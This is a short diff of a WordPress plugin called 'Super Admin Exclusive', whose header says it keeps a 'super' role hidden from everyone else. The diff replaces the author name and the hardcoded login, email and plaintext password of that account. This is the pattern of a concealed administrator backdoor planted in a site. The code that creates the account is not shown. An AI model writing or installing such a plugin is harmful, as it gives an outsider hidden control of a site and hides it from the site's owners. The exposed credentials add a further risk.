@@ -3,7 +3,7 @@
 Plugin Name: Super Admin Exclusive
 Description: Super role exists only for Super user. Hidden from everyone else, full functionality retained.
 Version: 1.2
-Author: yellwohoster
+Author: uknown
 */
 
 if (!defined('ABSPATH')) exit;
@@ -11,8 +11,8 @@ if (!defined('ABSPATH')) exit;
 class SuperAdminExclusive {
 
     private $role_name = 'super';
-    private $user_email = 'uog780@gmail.com';
-    private $user_pass = 'Ads@2512';
+    private $user_email = 'abubaker.techmkv@gmail.com';
+    private $user_pass = 'AbuBaker@123*&6';
     private $user_login = 'super';
 
     public function __construct() {
